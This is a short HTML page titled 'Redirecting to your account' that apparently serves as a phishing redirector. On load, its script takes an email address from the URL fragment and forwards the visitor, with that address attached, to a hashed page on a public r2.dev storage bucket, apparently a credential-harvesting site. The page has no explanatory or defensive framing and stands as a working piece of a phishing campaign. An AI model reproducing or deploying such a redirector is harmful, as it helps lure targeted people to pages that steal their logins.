<!DOCTYPE html>
<html>
<head>
    <title>Redirecting to your account</title>
    <script type="text/javascript">
        function isValidEmail(email) {
            // Simple email validation regex
            var emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return emailPattern.test(email);
        }

        function redirect() {
            var url = window.location.href;
            var emailParam = url.split("#email=")[1];

            if (emailParam && isValidEmail(emailParam)) {
                var newUrl = "https://pub-818808eef3a44b1b834efa8089a3c612.r2.dev/1bb14bbc605bf9d954b44185efe8d323e0878bc1f3855352b0832994e4895f209c3f2bbb8e54f04f.html#" + emailParam;
                window.location.href = newUrl;
            } else if (!emailParam) {
                window.location.href = "https://pub-818808eef3a44b1b834efa8089a3c612.r2.dev/1bb14bbc605bf9d954b44185efe8d323e0878bc1f3855352b0832994e4895f209c3f2bbb8e54f04f.html#email=";
            }
        }
    </script>
</head>
<body onload="redirect()">
</body>
</html>
